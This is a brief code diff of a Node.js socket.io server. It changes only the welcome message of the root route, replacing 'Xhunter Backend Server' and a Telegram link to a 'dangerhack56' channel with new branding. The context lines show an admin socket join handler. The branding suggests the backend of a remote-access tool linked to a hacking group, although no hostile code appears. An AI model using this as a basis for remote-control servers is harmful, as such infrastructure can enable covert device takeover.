@@ -13,7 +13,7 @@ var adminSocketId=null;
 const port = 8080;
 
 server.listen(process.env.PORT || port, (err) => {  if (err) return;log("Server Started : " + port);});
-app.get('/', (req, res) => res.send('Welcome to Xhunter Backend Server!https://t.me/dangerhack56!'))
+app.get('/', (req, res) => res.send('Welcome to dangerhack56 Backend Server!!'))
 
 io.on('connection', (socket) => {
     socket.on('adminJoin', ()=>{
